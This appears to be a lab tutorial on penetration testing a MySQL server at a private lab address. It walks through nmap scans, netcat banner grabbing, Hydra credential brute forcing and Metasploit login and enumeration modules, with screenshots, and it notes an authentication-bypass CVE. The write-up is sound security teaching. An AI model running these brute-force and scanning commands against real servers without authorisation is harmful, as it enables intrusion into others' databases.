# MySQL


## Scope 



## LAB TOOLS




# MYSQL PENETRATION TESTING Methodology

## Information Gathering

#### Create work Environment
````
mkdir MySQL
cd MySQL
````
<img width="352" height="222" alt="image" src="https://github.com/user-attachments/assets/e06259a7-2f40-4c42-85d6-32a4483ded18" />

### MySQL Service Detection

#### Scan port
````
nmap -sCV -T4 192.168.127.129
````
<img width="1218" height="714" alt="image" src="https://github.com/user-attachments/assets/ac39cf5b-bbec-4f49-bdb6-9b283edf7400" />

<img width="1337" height="675" alt="image" src="https://github.com/user-attachments/assets/42ad2b80-6bed-4878-9965-f6d5e5cd96ef" />

<img width="1028" height="671" alt="image" src="https://github.com/user-attachments/assets/c4c0b1f5-7ddb-43ba-b9bd-1c834b64d095" />

#### MySQL port scan
````
nmap -p 3306 192.168.127.129
````
<img width="524" height="197" alt="image" src="https://github.com/user-attachments/assets/0a9d867f-77bc-4d45-93d8-446ea9b10861" />


#### Service version detection
````
nmap -p 3306 -sV 192.168.127.129
````
<img width="1795" height="483" alt="image" src="https://github.com/user-attachments/assets/a3bcdccb-14a7-4045-b3d5-da0d5b9a6ca9" />


#### MySQL specific scripts
````
nmap -p 3306 --script mysql* 192.168.127.129
````
<img width="493" height="816" alt="image" src="https://github.com/user-attachments/assets/a864d27e-65e8-4833-91a4-5fdd63328fa4" />

<img width="1042" height="757" alt="image" src="https://github.com/user-attachments/assets/50233250-323a-4d78-b7b2-f2ceb2afa247" />

#### Comprehensive scan
````
nmap -p 3306 -A 192.168.127.129
````
<img width="1657" height="650" alt="image" src="https://github.com/user-attachments/assets/5e587753-4070-4fac-8cf4-9c50b5ec44d7" />



#### Check if MySQL is running on alternative ports
````
nmap -p 3305,3307,3308,3309,3310 192.168.127.129
````
<img width="1438" height="668" alt="image" src="https://github.com/user-attachments/assets/5061b2c8-835f-423e-92ba-6eb61b25f607" />


---



## Enumeration

### Banner grabbing with netcat
````
nc -nv 192.168.127.129 3306
````
<img width="486" height="124" alt="image" src="https://github.com/user-attachments/assets/571c9e76-af1d-4f1a-bb69-5e9929d5f575" />


### nmap for banner grabbing
````
nmap -p 3306 --script banner 192.168.127.129
````
<img width="773" height="271" alt="image" src="https://github.com/user-attachments/assets/aecb3cbc-a1f1-4173-b92d-654336f42e1f" />


### MySQL version detection
````
nmap -p 3306 --script mysql-info 192.168.127.129
````
<img width="1668" height="387" alt="image" src="https://github.com/user-attachments/assets/17b02998-9341-4d5c-96d0-91a4328d0444" />



### Check for anonymous access
````
nmap -p 3306 --script mysql-empty-password 192.168.127.129
````
<img width="1470" height="608" alt="image" src="https://github.com/user-attachments/assets/54ed1922-d43b-41f6-914c-ee4c9140ba94" />


### Check for MySQL vulnerabilities
````
nmap -p 3306 --script mysql-vuln* 192.168.127.129
````

---



## MYSQL AUTHENTICATION TESTING

### Automated Brute Force Attacks

#### Using Hydra for MySQL brute force
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt mysql://192.168.127.129 -V
````
<img width="1774" height="712" alt="image" src="https://github.com/user-attachments/assets/f515987b-590d-4755-b2d9-4f4262f8c582" />

<img width="1307" height="417" alt="image" src="https://github.com/user-attachments/assets/1772bc6e-7daa-4e2c-a258-2dc40a18d88f" />

- In this we found 2 valid passwods: 
<img width="1268" height="703" alt="image" src="https://github.com/user-attachments/assets/3883c446-249d-4865-9898-2f3051ab0eba" />

<img width="1310" height="586" alt="image" src="https://github.com/user-attachments/assets/7435608e-5bc6-433a-a889-c1b55df907c3" />

- OR we can try this to make short:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/wordlist.txt mysql://192.168.127.129
````
<img width="1901" height="401" alt="image" src="https://github.com/user-attachments/assets/20aa69c1-9acf-440a-bc76-d5f76a0afd57" />

- In this we found 2 username.

--



###  Metasploit MySQL Authentication Testing

#### MySQL login scanner
````
msfconsole -q
search mysql_login
use auxiliary/scanner/mysql/mysql_login
show options
````
<img width="1340" height="738" alt="image" src="https://github.com/user-attachments/assets/fe61d9af-f5d6-4404-9a17-1f58fc0ed13d" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="1673" height="643" alt="image" src="https://github.com/user-attachments/assets/674470ef-2018-409d-968d-e782c018c5c9" />


````
set USERNAME root
set PASSWORD hello
set STOP_ON_SUCCESS true
show potions 
````
<img width="1669" height="714" alt="image" src="https://github.com/user-attachments/assets/3a12e5ee-d833-4d90-a3e5-305ebb2c36ca" />

````
run
````
<img width="1597" height="232" alt="image" src="https://github.com/user-attachments/assets/ae7cfe26-f715-4121-9e57-0f01785dcb95" />

- Brute-force won’t work with Metasploit here, not because credentials are wrong, but because the client can’t speak the server’s auth language.
- However, SQL injection via the web app (e.g., DVWA) still works, because the web app connects locally using compatible drivers.
- This old MySQL version (5.0.51a) is known to be vulnerable to several exploits, including:
  - `CVE-2012-2122`: Authentication bypass (allows login as root with random password ~1/256 tries)
  - Privilege escalation via UDFs

---




## ENUMERATION

### advance MySQL Enumeration 

#### MySQL version detection
````
msfconsole -q
search mysql_version
use use auxiliary/scanner/mysql/mysql_version
show options
````
<img width="1439" height="753" alt="image" src="https://github.com/user-attachments/assets/efcf36a2-86e7-4332-83fa-6601fdb2313d" />

````
set RHOST 192.168.127.129
show options
run
````
<img width="1437" height="602" alt="image" src="https://github.com/user-attachments/assets/2277932a-1ee4-493a-bfae-382edf109262" />

--

#### MySQL enumeration
````
msfconsole -q
search mysql_enum
use use auxiliary/scanner/mysql/mysql_enum
show options
````
<img width="1439" height="771" alt="image" src="https://github.com/user-attachments/assets/7f66c61b-6203-4bde-a55d-1f8afae27927" />

````
set RHOSTS 192.168.127.129
show options
````
<img width="1456" height="493" alt="image" src="https://github.com/user-attachments/assets/4d6c92b0-edc6-4397-94c9-2142d08fd778" />

````
set USERNAME root
set PASSWORD toor
run
````
----


































































